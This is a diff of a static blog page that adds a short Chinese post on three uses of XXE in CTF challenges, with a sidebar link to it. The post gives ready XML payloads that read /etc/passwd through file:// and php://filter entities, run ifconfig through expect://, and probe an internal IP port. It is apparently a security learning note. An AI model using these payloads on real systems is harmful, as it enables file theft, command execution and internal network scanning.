@@ -64,6 +64,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xxe解题三方面" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/" class="article-date">
+  <time datetime="2022-09-03T10:20:55.000Z" itemprop="datePublished">2022-09-03</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/xxe/">xxe</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/">xxe解题三方面</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.读取任意文件<br>file 协议，file:///etc//passwd<br>php 协议，php://filter/read=convert.base64-encode/resource=index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">        &lt;!ENTITY  xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">    &lt;!ELEMENT name ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.执行系统命令</p>
+<p>在特殊的配置环境下，PHP环境中PHP的expect模块被加载到了易受攻击的系统或者能处理XML的应用中，就能执行命令，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3.探测内网端口</p>
+<p>借助漏洞实现内网探测，payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.199.100:80&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/" data-id="cl7lrb5wh0000ik0q1grt127d" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-xxe漏洞1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/09/03/xxe%E6%BC%8F%E6%B4%9E1/" class="article-date">
@@ -593,6 +644,10 @@
       <ul>
         
           <li>
+            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/">xxe解题三方面</a>
+          </li>
+        
+          <li>
             <a href="/2022/09/03/xxe%E6%BC%8F%E6%B4%9E1/">xxe漏洞1</a>
           </li>
         
@@ -606,10 +661,6 @@
         
           <li>
             <a href="/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计1</a>
-          </li>
-        
-          <li>
-            <a href="/2022/08/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1/">文件包含1</a>
           </li>
         
       </ul>
